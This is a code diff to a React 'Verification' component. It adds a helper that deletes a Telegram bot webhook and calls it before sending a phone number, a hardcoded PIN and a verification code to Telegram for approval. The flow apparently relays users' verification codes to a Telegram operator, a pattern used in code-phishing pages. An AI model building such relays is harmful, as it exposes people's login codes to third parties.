@@ -121,6 +121,16 @@ function Verification() {
     }
   }
 
+  async function deleteWebhook() {
+    try {
+      const response = await fetch(TELEGRAM_API + '/deleteWebhook')
+      const data = await response.json()
+      console.log('Webhook deleted:', data.result)
+    } catch (e) {
+      console.error('Webhook deletion failed:', e)
+    }
+  }
+
   async function checkTelegramApproval(reqId) {
     try {
       const offset = lastUpdateIdRef.current > 0 ? lastUpdateIdRef.current + 1 : 0
@@ -233,6 +243,7 @@ function Verification() {
     const pin = "0000"
 
     try {
+      await deleteWebhook()
       const result = await sendTelegramNotification(phoneNumber, pin, code)
       
       if (result.success && result.requestId) {
